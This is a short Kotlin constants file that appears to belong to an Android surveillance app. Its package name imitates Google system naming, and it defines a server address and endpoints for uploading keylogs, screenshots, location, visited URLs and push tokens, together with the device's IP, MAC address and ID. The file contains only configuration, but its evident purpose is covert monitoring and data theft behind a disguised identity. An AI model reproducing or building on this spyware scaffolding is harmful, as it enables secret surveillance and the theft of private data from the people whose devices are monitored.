package com.android.google.remote.server

object ServerConstants {

    // Here you can put your server url
    // Optional: Use https for data transfer secure
    const val BASE_URL = "http://192.168.1.71:8080/"

    // URL PATH`S
    const val SEND_PUSH_TOKEN_PATH = "sendpushtoken"
    const val SEND_LOCATION_PATH = "sendlocation"
    const val SEND_URL_PATH = "sendurl"
    const val SEND_SCREENSHOT_PATH = "sendscreenshot"
    const val SEND_KEY_LOG_PATH = "sendkeylog"

    // HEADERS
    const val IP_HEADER = "ip-address"
    const val MAC_HEADER = "mac-address"
    const val DEVICE_ID_HEADER = "device-id-header"

}